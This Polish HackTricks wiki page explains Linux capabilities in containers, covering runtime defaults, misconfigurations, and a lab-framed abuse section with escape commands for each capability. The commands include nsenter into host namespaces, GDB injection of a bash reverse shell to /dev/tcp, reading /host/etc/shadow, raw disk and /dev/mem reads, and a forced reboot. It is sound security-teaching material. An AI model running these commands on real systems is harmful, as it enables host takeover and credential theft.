# Linux Capabilities w kontenerach

{{#include ../../../../banners/hacktricks-training.md}}

## Omówienie

Linux capabilities są jednym z najważniejszych elementów bezpieczeństwa kontenerów, ponieważ odpowiadają na subtelne, ale fundamentalne pytanie: **co tak naprawdę oznacza „root” wewnątrz kontenera?** W zwykłym systemie Linux UID 0 historycznie oznaczał bardzo szeroki zestaw uprawnień. We współczesnych jądrach uprawnienia te są podzielone na mniejsze jednostki zwane capabilities. Proces może działać jako root, a mimo to nie mieć dostępu do wielu zaawansowanych operacji, jeśli odpowiednie capabilities zostały usunięte. <sup>[[1]](#references)</sup>

Kontenery w dużej mierze opierają się na tym rozróżnieniu. Wiele obciążeń nadal jest uruchamianych jako UID 0 wewnątrz kontenera ze względu na zgodność lub prostotę. Bez odebrania capabilities byłoby to o wiele zbyt niebezpieczne. Po ich odebraniu proces root w kontenerze nadal może wykonywać wiele zwykłych zadań wewnątrz kontenera, ale nie może wykonywać bardziej wrażliwych operacji jądra. Dlatego powłoka kontenera, która pokazuje `uid=0(root)`, nie oznacza automatycznie „roota hosta” ani nawet „szerokich uprawnień jądra”. Zestawy capabilities decydują o tym, jak wiele naprawdę daje tożsamość root.

Pełny opis Linux capabilities i wiele przykładów ich nadużyć znajdziesz tutaj:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Działanie

Capabilities są śledzone w kilku zestawach, między innymi permitted, effective, inheritable, ambient i bounding. W przypadku wielu ocen kontenerów dokładna semantyka każdego zestawu na poziomie jądra jest mniej istotna niż końcowe, praktyczne pytanie: **jakie uprzywilejowane operacje ten proces może teraz skutecznie wykonać i jakie przyszłe możliwości uzyskania uprawnień są nadal dostępne?** <sup>[[1]](#references)</sup>

To ważne, ponieważ wiele technik ucieczki z kontenera to w rzeczywistości problemy związane z capabilities, które wyglądają jak problemy z kontenerami. Obciążenie z `CAP_SYS_ADMIN` może uzyskać dostęp do ogromnej liczby funkcji jądra, których zwykły proces root w kontenerze nie powinien używać. Obciążenie z `CAP_NET_ADMIN` staje się o wiele bardziej niebezpieczne, jeśli współdzieli przestrzeń nazw sieci hosta. Obciążenie z `CAP_SYS_PTRACE` staje się znacznie ciekawsze, jeśli może widzieć procesy hosta dzięki współdzieleniu przestrzeni nazw PID hosta. W Dockerze lub Podmanie może to być ustawione przez `--pid=host`; w Kubernetes zwykle przez `hostPID: true`.

Innymi słowy, zestawu capabilities nie można oceniać w oderwaniu od pozostałych ustawień. Należy analizować go razem z przestrzeniami nazw, seccomp i polityką MAC.

## Laboratorium

Bardzo prostym sposobem sprawdzenia capabilities wewnątrz kontenera jest:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Możesz również porównać bardziej restrykcyjny kontener z kontenerem, któremu dodano wszystkie capabilities:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Aby zobaczyć efekt ograniczonego dodania, spróbuj usunąć wszystkie capabilities i dodać z powrotem tylko jedną:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Te niewielkie eksperymenty pomagają pokazać, że runtime nie przełącza po prostu wartości logicznej o nazwie „privileged”. Kształtuje rzeczywisty zakres uprawnień dostępnych dla procesu.

## Capabilities wysokiego ryzyka

Capabilities stają się prymitywami escape tylko wtedy, gdy ich operacja obejmuje **zasób kontrolowany przez hosta**. Powtarzające się kombinacje wysokiego ryzyka to:

- **`CAP_SYS_ADMIN`** w połączeniu z hostowym PID-em, urządzeniem blokowym lub zapisywalną ścieżką kontroli jądra. Dołączenie do docelowej przestrzeni nazw montowań wymaga dodatkowo `CAP_SYS_CHROOT`; montowanie systemu plików opartego na urządzeniu blokowym wymaga `CAP_SYS_ADMIN` w początkowej przestrzeni nazw użytkowników.
- **`CAP_SYS_PTRACE`** w połączeniu z widocznością hostowych PID-ów i dostępnym procesem hosta, do którego można się podłączyć. Do wstrzykiwania przez ptrace nie jest wymagane `CAP_SYS_ADMIN`.
- **`CAP_DAC_OVERRIDE` lub `CAP_DAC_READ_SEARCH`** w połączeniu z dostępnym systemem plików hosta. Te capabilities omijają różne kontrole DAC, ale nie zapewniają widoku systemu plików hosta.
- **`CAP_SYS_MODULE`** w początkowej przestrzeni nazw użytkowników w połączeniu z zaakceptowanym, zgodnym z jądrem modułem. Zwykłe kontenery Linux współdzielą jądro węzła; runtime’y oparte na VM lub jądrze działającym w przestrzeni użytkownika zmieniają tę granicę.
- **`CAP_MKNOD`** w początkowej przestrzeni nazw użytkowników w połączeniu z rzeczywistym urządzeniem hosta, na które zezwala już cgroup urządzeń. Utworzenie węzła nie omija cgroup urządzeń.
- **`CAP_SYS_RAWIO`** w połączeniu z udostępnionym i użytecznym interfejsem pamięci, portów I/O, PCI lub kontroli urządzeń.
- **`CAP_SYS_BOOT`** w połączeniu z początkową przestrzenią nazw PID, aby ponownie uruchomić hosta, albo z użyteczną i dozwoloną ścieżką kexec, aby zastąpić jądro.
- **`CAP_NET_ADMIN`** w hostowej przestrzeni nazw sieciowej, aby bezpośrednio kontrolować stan sieci węzła. **`CAP_NET_RAW`** może być elementem escape specyficznego dla danego protokołu, ale same raw sockets nie zapewniają powłoki węzła.

`CAP_SYS_CHROOT` celowo nie jest wymienione jako samodzielna capability umożliwiająca escape. Może być wymagane przez `setns()` dla przestrzeni nazw montowań i ułatwiać korzystanie z już dostępnego drzewa hosta, ale samo `chroot()` ani nie udostępnia tego drzewa, ani nie przyznaje nowych uprawnień do systemu plików. Podobnie `CAP_BPF` i `CAP_PERFMON` zapewniają dostęp do zaawansowanej telemetrii i powierzchni ataku jądra, ale bez odrębnej luki w jądrze ich zwykłe operacje nie pozwalają na ogólny escape z kontenera.

## Zastosowanie w runtime’ach

Docker, Podman, stosy oparte na containerd i CRI-O korzystają z kontroli capabilities, ale różnią się domyślnymi ustawieniami i interfejsami zarządzania. Docker udostępnia je bezpośrednio za pomocą flag takich jak `--cap-drop` i `--cap-add`. Podman udostępnia podobne mechanizmy i często łączy je z uruchamianiem bez uprawnień roota jako dodatkową warstwą bezpieczeństwa. Kubernetes umożliwia dodawanie i odbieranie capabilities za pomocą `securityContext` poda lub kontenera; runtime’y niższego poziomu zapisują wynikowe zestawy w konfiguracji runtime’u OCI. Środowiska kontenerów systemowych, takie jak LXC i Incus, również opierają się na kontroli capabilities, ale ich szersza integracja z hostem może skłaniać operatorów do łagodzenia domyślnych ustawień bardziej, niż zrobiliby to w przypadku kontenera aplikacyjnego. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Ta sama zasada obowiązuje we wszystkich tych środowiskach: capability, której nadanie jest technicznie możliwe, niekoniecznie powinna zostać nadana. Wiele incydentów w rzeczywistych środowiskach zaczyna się od tego, że operator dodaje capability tylko dlatego, że workload nie działał przy bardziej restrykcyjnej konfiguracji, a zespół potrzebował szybkiego rozwiązania.

## Błędne konfiguracje

Najbardziej oczywistym błędem jest użycie **`--cap-add=ALL`** w CLI w stylu Docker/Podman, ale to nie jedyny problem. W praktyce częściej zdarza się przyznanie jednej lub dwóch wyjątkowo potężnych capabilities, zwłaszcza `CAP_SYS_ADMIN`, aby „uruchomić aplikację” bez zrozumienia wpływu przestrzeni nazw, seccomp i montowań. Innym częstym błędem jest łączenie dodatkowych capabilities ze współdzieleniem przestrzeni nazw hosta. W Dockerze lub Podmanie może to przyjmować postać `--pid=host`, `--network=host` lub `--userns=host`; w Kubernetes równoważne narażenie zwykle wynika z ustawień workloadu, takich jak `hostPID: true` lub `hostNetwork: true`. Każda z tych kombinacji zmienia to, na co dana capability faktycznie może oddziaływać.

Często zdarza się również, że administratorzy zakładają, iż skoro workload nie działa z pełnym `--privileged`, to nadal podlega istotnym ograniczeniom. Czasami tak jest, ale niekiedy efektywna konfiguracja jest już na tyle zbliżona do uprzywilejowanej, że w praktyce to rozróżnienie przestaje mieć znaczenie.

## Nadużycie

Zacznij od zapisania efektywnych zestawów capabilities, mapowania przestrzeni nazw użytkowników, stanu seccomp, przestrzeni nazw, montowań i urządzeń. Sama nazwa capability, bez tego kontekstu, nie dowodzi możliwości escape:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: przestrzenie nazw i urządzenia blokowe

Przy widoczności PID hosta `CAP_SYS_ADMIN` może wejść do przestrzeni nazw hosta. Operacja w przestrzeni nazw montowań wymaga również `CAP_SYS_CHROOT` w przestrzeni nazw użytkownika wywołującego.

**Sprawdź capability i ograniczenia:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Rozpoznaj cel:** potwierdź współdzielenie PID hosta na podstawie konfiguracji kontenera/Poda lub jednoznacznej listy procesów hosta, a następnie sprawdź przestrzenie nazw celu. Lokalny PID 1 występuje również w prywatnych przestrzeniach nazw PID, więc sama jego obecność nie dowodzi współdzielenia PID hosta.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Wykorzystaj ścieżkę przestrzeni nazw:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Kontrole capabilities muszą przejść w user namespaces, które są właścicielami celów. `--pid=host` lub Kubernetes `hostPID: true` zapewnia widoczność, ale nie zapewnia capabilities.

W przypadku alternatywnej ścieżki z urządzeniem blokowym **wylicz** kandydatów, a następnie **exploituj** dostępny system plików, najpierw montując zweryfikowanego kandydata tylko do odczytu:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Węzeł urządzenia musi istnieć, device cgroup musi na to zezwalać, a montowanie systemów plików blokowych wymaga `CAP_SYS_ADMIN` w początkowej przestrzeni użytkowników. Katalog główny hosta zamontowany już przez bind w `/host` oznacza dostęp do hosta **bez** `CAP_SYS_ADMIN`; `chroot /host` to tylko udogodnienie i wymaga dodatkowo `CAP_SYS_CHROOT`.

### Dostępny katalog główny hosta: bezpośrednie wykonywanie z systemu plików

Jeśli katalog główny hosta jest już zamontowany w `/host`, najpierw potwierdź montowanie, a następnie skorzystaj bezpośrednio z istniejącego dostępu. Ta metoda nie zależy od `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Jeśli `chroot()` jest niedostępne, ale plik wykonywalny hosta jest zgodny z architekturą i loaderem kontenera, często można go wywołać przez zamontowane drzewo:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Bezpośredni odczyt i zapis w `/host` oznacza już przejęcie systemu plików hosta. `chroot()` lub uruchomienie pliku binarnego hosta jedynie ułatwia taki dostęp; żadna z tych operacji nie tworzy montowania hosta ani nie omija montowania tylko do odczytu lub zasad MAC.

### `CAP_SYS_PTRACE`: wstrzykiwanie do procesów hosta

Przy widoczności PID-ów hosta i `CAP_SYS_PTRACE` w przestrzeni nazw użytkowników procesu docelowego GDB może sprawić, że zatwierdzony proces hosta wywoła `system()`. `CAP_SYS_ADMIN` nie jest wymagane.

**Sprawdź uprawnienie i mechanizmy kontroli dołączania:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Wylicz i wybierz cel, który można poświęcić:** potwierdź współdzielenie PID hosta na podstawie konfiguracji lub jednoznacznej listy procesów węzła; nigdy nie wybieraj PID 1 ani krytycznego demona.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Wykorzystaj wybrany proces:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Proces docelowy musi umożliwiać dołączenie do niego oraz mieć dostępny symbol `system()` i ścieżkę do payloadu Bash. Yama, stan non-dumpable, seccomp, user namespaces i polityka MAC mogą zablokować ten łańcuch. GDB zatrzymuje proces docelowy na czas dołączenia, dlatego używaj wyłącznie jednorazowego procesu laboratoryjnego.

### `CAP_DAC_OVERRIDE` i `CAP_DAC_READ_SEARCH`: chronione pliki hosta

Te capabilities nie udostępniają systemu plików hosta. Jeśli `/host` jest już montowaniem hosta, `CAP_DAC_READ_SEARCH` może omijać kontrole DAC odczytu i wyszukiwania, a `CAP_DAC_OVERRIDE` może dodatkowo omijać standardowe kontrole zapisu:

**Sprawdź capabilities:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Zinwentaryzuj udostępniony system plików hosta i uprawnienia celu:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Przećwicz obejścia odczytu i zapisu** w tymczasowym środowisku laboratoryjnym:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Montowanie tylko do odczytu i reguły LSM nadal obowiązują. `CAP_DAC_READ_SEARCH` zezwala również na `open_by_handle_at()`, ale do ucieczki z kontenera, takiej jak Shocker, potrzebny jest dodatkowo deskryptor pliku montowania tego samego bazowego systemu plików, prawidłowe lub możliwe do odnalezienia uchwyty, zgodny układ systemu plików i pamięci masowej oraz brak blokady ze strony środowiska uruchomieniowego lub LSM. Nie zapewnia to dowolnego dostępu do każdego systemu plików poza przestrzenią nazw montowań.

### `CAP_SYS_MODULE`: wykonywanie kodu w współdzielonym jądrze

W zwykłym kontenerze Linux zaakceptowany moduł działa w współdzielonym jądrze hosta.

**Sprawdź zakres capability i user namespace:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Wymień wymagania wstępne dotyczące ładowania modułów:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Exploituj wyłącznie przy użyciu kompatybilnego, wcześniej sprawdzonego modułu proof na jednorazowym węźle:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Capability musi być efektywna w początkowej przestrzeni nazw użytkownika. Wersja i konfiguracja jądra, podpisy modułów, tryb lockdown, seccomp i polityka LSM muszą zezwalać na załadowanie. Kata, gVisor, izolacja Hyper-V i podobne środowiska uruchomieniowe zmieniają granicę jądra, z którą styka się obciążenie.

### `CAP_MKNOD`: utworzenie dozwolonego uchwytu urządzenia

`CAP_MKNOD` pozwala utworzyć węzeł urządzenia, ale nie omija device cgroup. Tworzenie urządzeń nie jest przestrzenią nazw, więc capability musi być efektywna w początkowej przestrzeni nazw użytkownika.

**Sprawdź capability i zakres przestrzeni nazw użytkownika:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Wymień rzeczywiste urządzenia, ich numery major/minor oraz widoczną allowlistę cgroup-v1:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Wykorzystaj zwalidowanego kandydata z rodziny ext w trybie tylko do odczytu:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Inne systemy plików wymagają odpowiedniego narzędzia tylko do odczytu; zamontowanie urządzenia wymaga dodatkowo `CAP_SYS_ADMIN`. Komunikat `Operation not permitted` podczas otwierania utworzonego węzła zwykle oznacza, że device cgroup nadal blokuje dostęp. W cgroup v2 dostęp do urządzeń jest zwykle egzekwowany za pomocą BPF, a plik `devices.list` nie istnieje, dlatego pomyślne otwarcie jest rozstrzygającym testem.

### `CAP_SYS_RAWIO`: dostępny interfejs raw-I/O

Nie ma przenośnego, uniwersalnego payloadu: prawidłowe adresy i efekty zależą od sprzętu i konfiguracji jądra.

**Sprawdź capability i zakres user namespace:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Wymień ujawnione surowe interfejsy, sprzęt i sterowniki:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Wykonuj exploit wyłącznie przy użyciu zatwierdzonego proofa dla zidentyfikowanego urządzenia i zakresu adresów.** Jeśli `/dev/mem` jest interfejsem zatwierdzonym do użycia w laboratorium, ten szablon potwierdza możliwość ujawnienia zawartości pamięci węzła bez jej wyświetlania:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Adres musi pochodzić z mapy sprzętowej laboratorium, ponieważ odczyt niektórych obszarów MMIO może powodować skutki uboczne. Ogólne polecenie zapisu do pamięci byłoby mylące i niebezpieczne: ten sam adres może być nieszkodliwy na jednej maszynie, a na innej sterować sprzętem lub pamięcią jądra. Dostęp do użytecznych zasobów często blokują cgroups urządzeń, uprawnienia systemu plików, restrykcyjne ustawienia `/dev/mem`, kernel lockdown, wirtualizacja i zasady LSM.

### `CAP_SYS_BOOT`: ponowne uruchomienie namespace lub zastąpienie jądra

W prywatnym PID namespace `reboot()` kończy działanie procesu init tego namespace, zamiast ponownie uruchamiać hosta. Wpływ na ponowne uruchomienie hosta wymaga zatem dostępu do początkowego PID namespace, zwykle przez współdzielenie PID z hostem. Ścieżka kexec wymaga również zgodnego obrazu jądra oraz pobłażliwych ustawień lockdown/podpisów:

**Sprawdź capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Wymień wymagania wstępne dotyczące przestrzeni nazw PID i kexec:** potwierdź współdzielenie PID hosta na podstawie konfiguracji workloadu, ponieważ samo łącze do przestrzeni nazw PID nie ujawnia, czy jest to początkowa przestrzeń nazw węzła.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Exploituj tylko wtedy, gdy ponowne uruchomienie jednorazowego węzła laboratoryjnego jest wyraźnie wskazane jako element ćwiczenia:**

```bash
sync
reboot -f
```

Nie uruchamiaj tego polecenia ani nie ładuj modułu jądra w współdzielonym węźle tylko po to, by udowodnić posiadanie tej capability. W prywatnej przestrzeni nazw PID kończy ono tylko proces init tej przestrzeni i nie demonstruje wpływu na hosta.

### `CAP_NET_ADMIN` i `CAP_NET_RAW`: ścieżki sieciowe hosta

`CAP_NET_ADMIN` wpływa tylko na bieżącą przestrzeń nazw sieci.

**Sprawdź capabilities i ograniczenia:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Wylicz bieżącą sieć i potwierdź użycie sieci hosta na podstawie konfiguracji workloadu:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Korzystaj z `CAP_NET_ADMIN` w sposób odwracalny:** przy użyciu host networking tymczasowy interfejs jest interfejsem węzła.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` zezwala na używanie gniazd RAW i PACKET, ale nie zapewnia ogólnej powłoki hosta. Aby **wyliczyć** udokumentowany łańcuch GCE, sprawdź trasę do metadanych i przechwyć ruch, by ustalić, czy widoczny jest plaintextowy ruch guest-agenta:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Jeśli istnieją wymagane warunki wstępne, **exploit** łańcuch ataku specyficzny dla danego środowiska, opisany w [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): przechwyć żądanie i stan sekwencji, wstrzyknij sfałszowaną odpowiedź metadanych zawierającą klucz SSH, a następnie zweryfikuj dostęp do hosta. Łańcuch wymagał uprawnień root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, nieszyfrowanego ruchu do metadanych GCE oraz żądania guest-agenta podatnego na race condition; nowoczesny transport lub zachowanie agenta mogą uniemożliwić jego wykorzystanie.

### Ograniczenia dotyczące lokalnego źródła i adresy interfejsów

Listener może odrzucać połączenia, których źródłem jest `127.0.0.1`, ale pomijać inny adres przypisany do tej samej przestrzeni nazw sieciowych. Jeśli listener jest osiągalny przez ten interfejs, porównaj połączenie loopback z połączeniem powiązanym z istniejącym lokalnym adresem innym niż loopback. `CAP_NET_ADMIN` może umożliwiać konfigurację interfejsów w bieżącej przestrzeni nazw, ale nie jest potrzebne, jeśli odpowiedni adres jest już przypisany. `CAP_NET_RAW` nie jest wymagane do zwykłego połączenia TCP. To błąd klasyfikacji adresu źródłowego, a nie ucieczka z kontenera ani dowód, że aplikacja autoryzuje uprzywilejowane żądanie.<sup>[[1]](#references)[[7]](#references)</sup>

W przypadku listenera WebSocket poprawna odpowiedź HTTP `101 Switching Protocols` potwierdza ukończenie uzgadniania połączenia; późniejszy błąd na poziomie aplikacji może wskazywać, że połączenie dotarło do handlera. Żadna z tych odpowiedzi nie dowodzi, że uwierzytelnianie lub żądana operacja zakończyły się powodzeniem.<sup>[[8]](#references)</sup>

## Kontrole

Celem sprawdzania capabilities jest nie tylko zrzucenie surowych wartości, ale także ustalenie, czy proces ma wystarczające uprawnienia, by jego bieżąca sytuacja dotycząca przestrzeni nazw i montowań stanowiła zagrożenie.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Co jest tutaj interesujące:

- `capsh --print` to najprostszy sposób na wykrycie wysokiego ryzyka capabilities, takich jak `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` czy `cap_sys_module`.
- Wiersz `CapEff` w `/proc/self/status` informuje, które capabilities są faktycznie aktywne w tej chwili, a nie tylko dostępne w innych zestawach.
- Zrzut capabilities staje się znacznie ważniejszy, jeśli kontener współdzieli także hostowe PID, network lub user namespaces albo ma zapisywalne hostowe mounty.

Po zebraniu surowych informacji o capabilities kolejnym krokiem jest ich interpretacja. Sprawdź, czy proces działa jako root, czy aktywne są user namespaces, czy współdzielone są hostowe namespaces, czy seccomp egzekwuje ograniczenia oraz czy AppArmor lub SELinux nadal ograniczają proces. Sam zestaw capabilities to tylko część obrazu, ale często właśnie on wyjaśnia, dlaczego jeden container breakout działa, a inny zawodzi, mimo pozornie identycznego punktu wyjścia.

## Domyślne ustawienia runtime'ów

| Runtime / platforma | Stan domyślny | Domyślne działanie | Częste ręczne osłabienie zabezpieczeń |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie ograniczony zestaw capabilities | Docker zachowuje domyślną listę dozwolonych capabilities, a pozostałe odrzuca | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Domyślnie ograniczony zestaw capabilities | Kontenery Podman są domyślnie nieuprzywilejowane i korzystają z ograniczonego modelu capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Dziedziczy domyślne ustawienia runtime'u, o ile nie zostaną zmienione | Jeśli nie określono `securityContext.capabilities`, kontener otrzymuje domyślny zestaw capabilities z runtime'u | `securityContext.capabilities.add`, pominięcie `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O w Kubernetes | Zwykle domyślne ustawienia runtime'u | Efektywny zestaw zależy od runtime'u i specyfikacji Poda | jak w wierszu dotyczącym Kubernetes; bezpośrednia konfiguracja OCI/CRI również może jawnie dodawać capabilities |

W przypadku Kubernetes ważne jest to, że API nie definiuje jednego uniwersalnego domyślnego zestawu capabilities. Jeśli Pod nie dodaje ani nie odrzuca capabilities, obciążenie dziedziczy domyślne ustawienia runtime'u danego węzła.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - strona podręcznika Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - konfiguracja kontenerów Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Dokumentacja Docker - uprawnienia runtime'u i capabilities Linux](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Dokumentacja Kubernetes - ustawianie capabilities dla kontenera](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Dokumentacja Podman - `--cap-add` i `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Dokumentacja Incus - bezpieczeństwo](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - implementacja protokołu IPv4 w systemie Linux](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - protokół WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
